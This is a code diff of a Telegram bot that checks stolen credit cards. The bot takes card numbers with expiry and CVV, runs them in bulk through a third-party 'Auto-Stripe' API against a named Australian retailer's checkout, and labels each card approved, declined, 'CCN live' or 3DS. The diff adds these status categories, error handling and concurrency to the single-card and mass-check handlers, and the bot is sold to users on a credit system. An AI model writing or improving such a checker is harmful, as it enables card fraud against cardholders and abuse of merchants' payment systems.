@@ -1151,10 +1151,21 @@ async def get_bin_details(bin_number: str) -> dict:
 
 
 # ✅ Background check now uses live BIN data
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+from telegram.ext import ContextTypes
+import aiohttp
+import asyncio
+
+# Assume these functions exist
+# get_user(user_id), consume_credit(user_id), enforce_cooldown(user_id, update)
+# get_bin_details(bin_number)
+BULLET_GROUP_LINK = "https://t.me/your_group"
+
 async def background_check(cc_normalized, parts, user, user_data, processing_msg):
     bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"
 
-    # Stylish response mapping
     def style_response(api_response: str):
         text = api_response.lower()
         if text in ["succeeded", "approved"]:
@@ -1163,20 +1174,24 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
         elif text == "failed":
             return "𝗙𝗔𝗜𝗟𝗘𝗗 ❌"
+        elif "ccn live" in text:
+            return "💳 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
+        elif "3d" in text or "threed" in text:
+            return "⚠️ 𝟯𝗗𝗦"
         else:
-            return f"**{api_response.upper()}**"  # Unknown responses in bold
+            return f"**{api_response.upper()}**"
 
     try:
-        # BIN details
+        # Get BIN info
         bin_number = parts[0][:6]
         bin_details = await get_bin_details(bin_number)
 
         brand = (bin_details.get("scheme") or "N/A").upper()
         issuer = (bin_details.get("bank") or "N/A").title()
-        country_name = (bin_details.get("country_name") or "N/A")
+        country_name = bin_details.get("country_name", "N/A")
         country_flag = bin_details.get("country_emoji", "")
 
-        # New Darkboy Auto-Stripe API URL
+        # Darkboy Auto-Stripe API
         api_url = (
             f"https://darkboy-auto-stripe.onrender.com"
             f"/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
@@ -1186,30 +1201,29 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             async with session.get(api_url, timeout=45) as resp:
                 if resp.status != 200:
                     raise Exception(f"HTTP {resp.status}")
-                data = await resp.json()
+                try:
+                    data = await resp.json()
+                except Exception:
+                    raw_text = await resp.text()
+                    raise Exception(f"Invalid JSON response: {raw_text[:200]}")
 
-        # Parse API response
         api_status = (data.get("status") or "").strip()
-        api_response = (data.get("response") or "").strip()
+        api_response_text = (data.get("response") or "").strip()
 
-        # Apply stylish formatting
-        status_text = style_response(api_status)
-        formatted_response = style_response(api_response)
-
-        # Prepare message
-        header = f"═══\\[ {escape_markdown_v2(status_text)} \\]═══"
+        styled_status = style_response(api_status)
+        styled_response = style_response(api_response_text)
 
         final_text = (
-            f"{header}\n"
-            f"{bullet_link} Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
-            f"{bullet_link} Gateway ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗼𝗴𝗮𝘁𝗲\n"
-            f"{bullet_link} Response ➜ {formatted_response}\n"
+            f"═══\\[ {escape_markdown(styled_status, version=2)} \\]═══\n"
+            f"{bullet_link} Card ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
+            f"{bullet_link} Gateway ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘶𝘁𝗼𝗴𝗮𝘁𝗲\n"
+            f"{bullet_link} Response ➜ {styled_response}\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} Brand ➜ {escape_markdown_v2(brand)}\n"
-            f"{bullet_link} Bank ➜ {escape_markdown_v2(issuer)}\n"
-            f"{bullet_link} Country ➜ {escape_markdown_v2(country_name)} {country_flag}\n"
+            f"{bullet_link} Brand ➜ {escape_markdown(brand, version=2)}\n"
+            f"{bullet_link} Bank ➜ {escape_markdown(issuer, version=2)}\n"
+            f"{bullet_link} Country ➜ {escape_markdown(country_name, version=2)} {country_flag}\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} Request By ➜ {escape_markdown_v2(user.first_name)}\\[{escape_markdown_v2(user_data.get('plan', 'Free'))}\\]\n"
+            f"{bullet_link} Requested By ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan', 'Free'), version=2)}\\]\n"
             f"{bullet_link} Developer ➜ [kคli liຖนxx](tg://resolve?domain=K4linuxx)\n"
             f"――――――――――――――――"
         )
@@ -1222,43 +1236,32 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
 
     except Exception as e:
         await processing_msg.edit_text(
-            f"❌ API Error: {escape_markdown_v2(str(e))}",
+            f"❌ API Error: {escape_markdown(str(e), version=2)}",
             parse_mode=ParseMode.MARKDOWN_V2,
             disable_web_page_preview=True
         )
 
 
-
-
-
-
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    chat = update.effective_chat
     user_id = user.id
 
     # Get user data
     user_data = await get_user(user_id)
     if not user_data:
-        await update.effective_message.reply_text(
-            "❌ Could not fetch your user data. Try again later.",
-            parse_mode=None
-        )
+        await update.effective_message.reply_text("❌ Could not fetch your user data. Try again later.")
         return
 
     # Check credits
     if user_data.get("credits", 0) <= 0:
-        await update.effective_message.reply_text(
-            "❌ You have no credits left. Please buy a plan to get more credits.",
-            parse_mode=None
-        )
+        await update.effective_message.reply_text("❌ You have no credits left. Please buy a plan to get more credits.")
         return
 
-    # Cooldown check
+    # Cooldown
     if not await enforce_cooldown(user_id, update):
         return
 
-    # Get card: reply or argument
+    # Get card input
     raw = None
     if update.message.reply_to_message and update.message.reply_to_message.text:
         raw = update.message.reply_to_message.text.strip()
@@ -1267,16 +1270,14 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not raw or "|" not in raw:
         await update.effective_message.reply_text(
-            "Usage: reply to a message containing number|mm|yy|cvv or use /chk number|mm|yy|cvv",
-            parse_mode=None
+            "Usage: reply to a message with number|mm|yy|cvv or use /chk number|mm|yy|cvv"
         )
         return
 
     parts = raw.split("|")
     if len(parts) != 4:
         await update.effective_message.reply_text(
-            "Invalid format. Use number|mm|yy|cvv (or yyyy for year).",
-            parse_mode=None
+            "Invalid format. Use number|mm|yy|cvv (or yyyy for year)."
         )
         return
 
@@ -1287,26 +1288,19 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Deduct credit
     if not await consume_credit(user_id):
-        await update.effective_message.reply_text(
-            "❌ No credits left.",
-            parse_mode=None
-        )
+        await update.effective_message.reply_text("❌ No credits left.")
         return
 
-
-    # Define bullet link
+    # Send processing message
     bullet_link = f"\[[₰]({BULLET_GROUP_LINK})\]"
-
-    # Processing message
     processing_text = (
-        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
-        f"{bullet_link} Card ➜ `{escape_markdown_v2(cc_normalized)}`\n"
-        f"{bullet_link} Gateway ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘶𝘵𝗵\n"
+        f"═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
+        f"{bullet_link} Card ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
+        f"{bullet_link} Gateway ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
         f"{bullet_link} Status ➜ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈\\.\\.\\.\n"
         "════════════════════"
     )
 
-    # Send processing message (await inside async function)
     processing_msg = await update.effective_message.reply_text(
         processing_text,
         parse_mode=ParseMode.MARKDOWN_V2,
@@ -1449,22 +1443,32 @@ async def consume_credit(user_id: int) -> bool:
 
 
 
+import aiohttp
+import asyncio
+import time
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+
 async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
     approved_count = declined_count = checked_count = error_count = 0
     results = []
     total_cards = len(cards_to_check)
 
-    semaphore = asyncio.Semaphore(5)  # limit to 5 concurrent requests
+    semaphore = asyncio.Semaphore(5)  # Limit to 5 concurrent requests
 
     # Stylish mapping function
     def style_response(api_response: str):
-        text = api_response.lower()
+        text = (api_response or "").lower()
         if text in ["succeeded", "approved"]:
             return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
         elif text == "declined":
             return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
         elif text == "failed":
             return "𝗙𝗔𝗜𝗟𝗘𝗗 ❌"
+        elif "ccn live" in text:
+            return "💳 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
+        elif "3d" in text or "threed" in text:
+            return "⚠️ 𝟯𝗗𝗦"
         else:
             return f"**{api_response.upper()}**"  # Unknown responses in bold
 
@@ -1483,7 +1487,6 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 parts[2] = parts[2][-2:]
             cc_normalized = "|".join(parts)
 
-            # New Darkboy Auto-Stripe API URL
             api_url = (
                 f"https://darkboy-auto-stripe.onrender.com"
                 f"/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
@@ -1520,10 +1523,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
 
             checked_count += 1
 
-            return (
-                f"`{cc_normalized}`\n"
-                f"𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {styled_response}"
-            )
+            return f"`{cc_normalized}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {styled_response}"
 
     async with aiohttp.ClientSession() as session:
         tasks = [check_card(session, raw) for raw in cards_to_check]
@@ -1534,7 +1534,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             result = await coro
             results.append(result)
 
-            # Periodic update
+            # Periodic progress update
             if time.time() - last_update >= update_interval:
                 last_update = time.time()
                 current_summary = (
@@ -1544,8 +1544,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                     f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
                     f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
                     f"✘ 𝐓𝐢𝐦𝐞↣{round(time.time() - start_time, 2)}s\n"
-                    f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
-                    f"──────── ⸙ ─────────"
+                    f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
                 )
                 try:
                     await processing_msg.edit_text(
@@ -1565,8 +1564,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
         f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
         f"✘ 𝐓𝐢𝐦𝐞↣{final_time_taken}s\n"
-        f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
-        f"──────── ⸙ ─────────"
+        f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
     )
     await processing_msg.edit_text(
         escape_markdown(final_summary, version=2) + "\n\n" +
@@ -1574,8 +1572,6 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         "\n──────── ⸙ ─────────",
         parse_mode=ParseMode.MARKDOWN_V2
     )
-
-
 
 
 
@@ -1817,10 +1813,16 @@ def normalize_status_string(status):
     return normalized_string
 
 # --- CARD CHECKER LOGIC ---
+import aiohttp
+import asyncio
+import time
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+
 async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
     """
     Asynchronously checks a list of credit cards using Darkboy Auto-Stripe API
-    and updates a Telegram message with the progress.
+    and updates a Telegram message with stylish responses.
     """
     approved_count = declined_count = checked_count = error_count = 0
     results = []
@@ -1838,23 +1840,25 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
     def style_response(api_response: str):
         text = api_response.lower()
         if text in ["succeeded", "approved"]:
-            return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
-        elif text == "declined":
-            return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
-        elif text == "failed":
-            return "𝗙𝗔𝗜𝗟𝗘𝗗 ❌"
+            return "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
+        elif text in ["declined", "failed"]:
+            return "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
+        elif "ccn live" in text:
+            return "💳 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
+        elif "3d" in text or "threed" in text:
+            return "⚠️ 𝟯𝗗𝗦"
         else:
-            return f"**{api_response.upper()}**"  # Unknown responses in bold
+            return f"❓ {api_response.upper()}"
 
     async with aiohttp.ClientSession() as session:
         async def fetch_card(card):
-            """Fetches the status of a single card from the Darkboy API."""
             nonlocal approved_count, declined_count, error_count
             async with semaphore:
-                parts = card.split("|")
+                parts = card.strip().split("|")
                 if len(parts) != 4:
                     error_count += 1
                     return card, "❌ Invalid card format"
+
                 # Normalize year (YYYY → YY)
                 if len(parts[2]) == 4:
                     parts[2] = parts[2][-2:]
@@ -1871,13 +1875,14 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                         data = await resp.json()
                         api_status = data.get("status", "").strip()
                         api_response_text = data.get("response", "").strip()
+
                         styled_status = style_response(api_status)
                         styled_response = style_response(api_response_text)
 
                         # Count statuses
-                        if api_status.lower() in ["approved", "succeeded"]:
+                        if "✅" in styled_status:
                             approved_count += 1
-                        elif api_status.lower() in ["declined", "failed"]:
+                        elif "❌" in styled_status:
                             declined_count += 1
 
                         return cc_normalized, styled_response
@@ -1893,7 +1898,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             raw, status = await coro
             checked_count += 1
 
-            # Escape dynamic content for MarkdownV2
+            # Escape for MarkdownV2
             raw_safe = escape_markdown(raw, version=2)
             status_safe = escape_markdown(status, version=2)
             results.append(f"`{raw_safe}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {status_safe}")
@@ -1909,7 +1914,7 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                     f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined_count}\n"
                     f"✘ 𝐄𝐫𝐫𝐨𝐫↣{error_count}\n"
                     f"✘ 𝐓𝐢𝐦𝐞↣{current_time_taken}s\n"
-                    f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
+                    f"\n𝗠𝗮𝘀𝐬 𝗖𝗵𝗲𝗰𝗸\n"
                     f"──────── ⸙ ─────────"
                 )
                 try:
@@ -1938,7 +1943,6 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
         parse_mode=ParseMode.MARKDOWN_V2
     )
-
 
 
 # --- /mass command handler ---
@@ -2291,12 +2295,12 @@ async def background_check_multi(update, context, cards, processing_msg):
     unknown = 0
     total = len(cards)
 
-    async def escape_md(text):
+    def escape_md(text: str) -> str:
         # Escape Telegram MarkdownV2 special characters
         special_chars = r'\_*[]()~`>#+-=|{}.!'
         return re.sub(f"([{re.escape(special_chars)}])", r"\\\1", text)
 
-    def normalize_status_text(text):
+    def normalize_status_text(text: str) -> str:
         """
         Normalize API responses to standardized stylish statuses.
         """
@@ -2340,7 +2344,7 @@ async def background_check_multi(update, context, cards, processing_msg):
             f"▌ [{bar}] ▌"
         )
         try:
-            await processing_msg.edit_text(await escape_md(progress_text), parse_mode=ParseMode.MARKDOWN_V2)
+            await processing_msg.edit_text(escape_md(progress_text), parse_mode=ParseMode.MARKDOWN_V2)
         except Exception:
             pass
 
@@ -2348,7 +2352,7 @@ async def background_check_multi(update, context, cards, processing_msg):
         semaphore = asyncio.Semaphore(7)
         tasks = [check_card(session, card, semaphore) for card in cards]
 
-        for i, task in enumerate(asyncio.as_completed(tasks)):
+        for task in asyncio.as_completed(tasks):
             card, stylish_status = await task
             results.append(f"`{card}` ➳ {stylish_status}")
 
@@ -2365,7 +2369,7 @@ async def background_check_multi(update, context, cards, processing_msg):
                 unknown += 1
 
             await update_progress(len(results))
-            await asyncio.sleep(1)  # Slight delay to avoid flooding edits
+            await asyncio.sleep(0.5)  # slight delay for smooth edits
 
     # Save results to file
     output_filename = "checked.txt"
